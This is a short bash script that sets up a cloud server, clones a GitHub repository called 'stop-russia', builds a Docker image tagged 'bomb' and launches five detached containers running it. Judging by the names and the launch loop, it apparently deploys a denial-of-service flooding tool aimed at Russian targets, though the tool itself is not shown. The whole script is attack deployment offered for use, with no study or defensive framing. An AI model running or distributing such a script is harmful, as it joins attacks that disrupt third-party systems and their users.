#!/bin/bash

apt -y update
apt -y install docker.io git

fallocate -l 1G /swapfile && chmod 600 /swapfile && mkswap /swapfile && swapon /swapfile 

git clone https://github.com/brzhv-cyb/stop-russia.git

cd stop-russia/automation/linode && docker build -t bomb .

NUMPROC=5

for proc in $(seq 1 $NUMPROC); do
  screen -d -m docker run -ti --cpus=".8" --rm bomb
done
